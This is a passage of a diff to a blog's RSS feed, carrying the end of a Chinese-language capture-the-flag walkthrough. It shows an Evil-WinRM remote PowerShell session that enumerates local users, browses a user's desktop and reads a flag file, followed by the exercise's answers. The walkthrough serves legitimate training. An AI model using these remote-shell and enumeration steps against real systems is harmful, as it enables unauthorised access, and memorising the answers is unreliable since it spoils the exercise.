+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User accounts &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-------------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Administrator            DefaultAccount           Guest
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mike                     WDAGUtilityAccount
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; completed with one or more errors.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;evil-winrm&lt;/code&gt; 可以直接通过账号密码拿到交互式 Shell（默认 PowerShell）。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net user&lt;/code&gt; 列出本机所有用户。其中 &lt;code&gt;Administrator&lt;/code&gt; 是管理员用户，&lt;code&gt;DefaultAccount / Guest / WDAGUtilityAccount&lt;/code&gt; 是系统内置默认账号，所以 &lt;code&gt;mike&lt;/code&gt; 大概率是突破点。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ike
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ike&amp;gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ike
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Mode                 LastWriteTime         Length Name
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----                 -------------         ------ ----
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;d-----         3/10/2022   4:51 AM                Desktop
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ike&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; .&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ike&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; dir
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ike&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Mode                 LastWriteTime         Length Name
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----                 -------------         ------ ----
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a----         3/10/2022   4:50 AM             &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ike&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; cat flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ea81b7afddd03efaa0945333ed147fac
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;答案：mike&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;submit-single-flag&#34;&gt;Submit Single Flag
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Submit the flag located on the mike user&amp;rsquo;s desktop.&lt;/p&gt;
+&lt;p&gt;提交位于 mike 用户桌面上的 flag。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;答案：ea81b7afddd03efaa0945333ed147fac&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>7. Sequel</title>
         <link>https://Sp1ke-sec.github.io/p/7.-sequel/</link>
         <pubDate>Sun, 01 Nov 2026 13:33:51 +0800</pubDate>
